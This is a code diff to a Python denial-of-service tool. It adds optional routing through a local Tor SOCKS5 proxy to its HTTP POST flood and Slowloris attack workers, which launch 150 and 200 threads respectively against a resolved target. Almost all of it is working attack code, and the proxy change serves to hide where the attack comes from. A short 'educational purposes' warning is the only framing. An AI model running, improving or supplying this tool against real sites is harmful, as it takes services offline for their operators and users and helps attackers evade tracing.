@@ -6,6 +6,7 @@ from scapy.layers.dns import DNS, DNSQR
 # Add the h2 library to your imports
 import h2.connection
 import h2.events
+import socks
 
 # ==============================================================================
 # WARNING: This is a Denial of Service (DoS) script for educational purposes.
@@ -239,43 +240,78 @@ def icmpflood(target_url, duration, stop_event, pause_event, threads=150):
     stop_event.set()
 
 
-# --- HTTP Flood ---
-# --- NEW: HTTP POST Flood Worker ---
-# This is more effective than a GET flood as it often bypasses caches and forces
-# server-side processing, consuming more CPU and database resources.
-def http_post_worker(stop_event, pause_event, target_ip, port, host_header):
-    """Worker thread that sends a continuous stream of HTTP POST requests."""
+# --- UPDATED L7 WORKERS WITH PROXY SUPPORT ---
+
+def http_post_worker(stop_event, pause_event, target_ip, port, host_header, use_proxy):
+    """Worker thread that sends a continuous stream of HTTP POST requests, optionally via a SOCKS proxy."""
+    s = None  # Initialize s to None for robust error handling
     while not stop_event.is_set():
         if pause_event.is_set():
             time.sleep(1)
             continue
         try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.settimeout(4)
-                s.connect((target_ip, port))
+            # Conditionally create a proxy socket or a standard socket
+            if use_proxy:
+                s = socks.socksocket()
+                # Default Tor proxy address and port
+                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+            else:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-                # Generate random data for the POST body
-                post_data = "".join(random.sample(string.ascii_letters + string.digits, 100))
-                user_agent = random.choice(USER_AGENTS)
+            # Proxied connections are slower, so allow a longer timeout
+            s.settimeout(20 if use_proxy else 4)
+            s.connect((target_ip, port))
 
-                # Craft the POST request with realistic headers
-                request = (
-                    f"POST / HTTP/1.1\n"  # Using root path, but a specific path like /login.php can be more effective
-                    f"Host: {host_header}\n"
-                    f"User-Agent: {user_agent}\n"
-                    f"Content-Type: application/x-www-form-urlencoded\n"
-                    f"Content-Length: {len(post_data)}\n"
-                    f"Connection: close\n\n"
-                    f"{post_data}"
-                ).encode()
-
-                s.send(request)
-        except socket.error:
+            post_data = "".join(random.sample(string.ascii_letters + string.digits, 100))
+            user_agent = random.choice(USER_AGENTS)
+            request = (f"POST / HTTP/1.1\nHost: {host_header}\nUser-Agent: {user_agent}\n"
+                       f"Content-Type: application/x-www-form-urlencoded\nContent-Length: {len(post_data)}\n"
+                       f"Connection: close\n\n{post_data}").encode()
+            s.send(request)
+        except Exception:  # Catch any error (socket, proxy, timeout, etc.)
             time.sleep(0.5)
+        finally:
+            if s:
+                s.close()
 
 
-# --- NEW: HTTP POST Flood Controller ---
-def attack_http_post(target_url, port, duration, stop_event, pause_event, threads=150):
+def slowloris_worker(stop_event, pause_event, target_ip, port, host_header, use_proxy):
+    """Worker thread that opens and maintains a single Slowloris connection, optionally via a SOCKS proxy."""
+    s = None
+    try:
+        if use_proxy:
+            s = socks.socksocket()
+            s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+        else:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+        s.settimeout(30 if use_proxy else 4)
+        s.connect((target_ip, port))
+
+        user_agent = random.choice(USER_AGENTS)
+        initial_headers = (f"GET /?{random.randint(0, 2000)} HTTP/1.1\nHost: {host_header}\n"
+                           f"User-Agent: {user_agent}\n").encode()
+        s.send(initial_headers)
+
+        while not stop_event.is_set():
+            if pause_event.is_set():
+                time.sleep(1)
+                continue
+            try:
+                s.send(f"X-a: {random.randint(1, 5000)}\n".encode())
+                time.sleep(15)
+            except socket.error:
+                break
+    except Exception:
+        pass
+    finally:
+        if s:
+            s.close()
+
+
+# --- UPDATED L7 CONTROLLERS TO ACCEPT `use_proxy` FLAG ---
+
+def attack_http_post(target_url, port, duration, stop_event, pause_event, threads=150, use_proxy=False):
     """Controller for HTTP POST flood attacks."""
     ips = resolve_to_ipv4(target_url)
     if not ips: return
@@ -283,63 +319,16 @@ def attack_http_post(target_url, port, duration, stop_event, pause_event, thread
     attack_end_time = time.time() + duration
     for ip in ips:
         for _ in range(threads):
-            t = threading.Thread(target=http_post_worker, args=(stop_event, pause_event, ip, port, target_url))
+            t = threading.Thread(target=http_post_worker,
+                                 args=(stop_event, pause_event, ip, port, target_url, use_proxy))
             t.daemon = True
             t.start()
-
     while time.time() < attack_end_time and not stop_event.is_set():
         time.sleep(1)
     stop_event.set()
 
 
-# --- Corrected and Robust Slowloris Attack Worker ---
-# This version prevents the "UnboundLocalError" by initializing `s` to None.
-def slowloris_worker(stop_event, pause_event, target_ip, port, host_header):
-    """
-    Worker thread that opens and maintains a single Slowloris connection.
-    This implementation is robust against connection errors.
-    """
-    # 1. Initialize `s` to None before the try block. This ensures it always exists.
-    s = None
-    try:
-        # 2. The assignment happens inside the try block.
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(4)
-        s.connect((target_ip, port))
-
-        # Send initial, incomplete headers to open the connection
-        user_agent = random.choice(USER_AGENTS)
-        initial_headers = (
-            f"GET /?{random.randint(0, 2000)} HTTP/1.1\n"
-            f"Host: {host_header}\n"
-            f"User-Agent: {user_agent}\n"
-        ).encode()
-        s.send(initial_headers)
-
-        # Main loop to keep the connection alive
-        while not stop_event.is_set():
-            if pause_event.is_set():
-                time.sleep(1)
-                continue
-            try:
-                # Send a "keep-alive" header periodically
-                keep_alive_header = f"X-a: {random.randint(1, 5000)}\n".encode()
-                s.send(keep_alive_header)
-                time.sleep(15)  # The "slow" part of the attack
-            except socket.error:
-                break  # Server likely closed the connection, so this thread is done
-    except socket.error:
-        pass  # Initial connection failed, thread terminates
-    finally:
-        # 3. In the finally block, check if `s` was successfully assigned a socket
-        #    before trying to call .close() on it. If `s` is still None, this
-        #    condition is false and the .close() method is never called.
-        if s:
-            s.close()
-
-
-# --- NEW: Slowloris Attack Controller ---
-def attack_slowloris(target_url, port, duration, stop_event, pause_event, sockets=200):
+def attack_slowloris(target_url, port, duration, stop_event, pause_event, sockets=200, use_proxy=False):
     """Controller for Slowloris attacks."""
     ips = resolve_to_ipv4(target_url)
     if not ips: return
@@ -347,10 +336,10 @@ def attack_slowloris(target_url, port, duration, stop_event, pause_event, socket
     attack_end_time = time.time() + duration
     for ip in ips:
         for _ in range(sockets):
-            t = threading.Thread(target=slowloris_worker, args=(stop_event, pause_event, ip, port, target_url))
+            t = threading.Thread(target=slowloris_worker,
+                                 args=(stop_event, pause_event, ip, port, target_url, use_proxy))
             t.daemon = True
             t.start()
-
     while time.time() < attack_end_time and not stop_event.is_set():
         time.sleep(1)
     stop_event.set()
